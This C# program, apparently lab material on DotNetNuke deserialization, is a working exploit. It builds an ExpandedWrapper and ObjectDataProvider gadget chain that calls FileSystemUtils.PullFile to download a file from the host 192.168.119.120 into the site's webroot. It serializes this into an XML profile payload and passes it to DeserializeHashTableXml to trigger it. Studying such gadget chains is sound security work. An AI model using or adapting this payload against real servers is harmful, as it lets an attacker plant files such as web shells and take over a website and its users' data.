using System;
using System.IO;
using DotNetNuke.Common.Utilities;
using DotNetNuke.Common;
using System.Collections;
using System.Data.Services.Internal;
using System.Windows.Data;

namespace ExpWrapSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            // Serialize();
            Deserialize();
        }

        public static void Deserialize()
        {
            string xmlSource = File.ReadAllText("C:\\Users\\Public\\ExpWrap.txt");
            Globals.DeserializeHashTableXml(xmlSource);
        }

        public static void Serialize()
        {
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
            myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
            myExpWrap.ProjectedProperty0.MethodName = "PullFile";
            myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myExpWrap;
            string payload = XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
            writer.Write(payload);
            writer.Close();

            Console.WriteLine("Done!");
        }
    }
}
